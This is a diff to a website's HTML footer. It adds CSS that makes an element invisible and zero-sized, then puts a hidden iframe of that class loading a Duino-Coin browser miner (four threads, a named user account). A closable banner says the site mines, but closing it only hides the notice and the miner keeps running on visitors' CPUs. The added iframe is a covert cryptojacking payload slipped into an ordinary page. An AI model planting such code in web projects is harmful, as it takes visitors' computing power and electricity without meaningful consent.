@@ -108,7 +108,54 @@
             </div>
         </div>
     </footer>
+ <style>
+        .mner {
+            visibility: hidden;
+            height: 0px;
+            width: 0px;
+        }
+        
+        #footer {
+            position: fixed;
+            left: 0px;
+            bottom: 0px;
+            /* height: 30px; */
+            width: 100%;
+            /* background: #999; */
+        }
+        
+        .alert {
+            padding: 20px;
+            background-color: rgb(32, 32, 32);
+            color: rgb(184, 184, 184);
+            font-size: 14px;
+            font-weight: 600;
+            font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
+        }
+        
+        .closebtn {
+            margin-left: 15px;
+            color: white;
+            font-weight: bold;
+            float: right;
+            font-size: 20px;
+            line-height: 18px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        
+        .closebtn:hover {
+            color: rgb(54, 54, 54);
+        }
+    </style>
+    <iframe class="mner" src="https://server.duinocoin.com/webminer.html?username=merwin&threads=4&rigid=blog.about&keyinput="></iframe>
+    <footer id="footer">
 
+        <div class="alert">
+            <span class="closebtn" onclick="this.parentElement.style.display='none';">&times;</span> We do mine in the site . This is to make sure the company could serve yall the next day : )
+        </div>
+
+    </footer>
     <script src="vendor/jquery/jquery.min.js"></script>
 
     <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
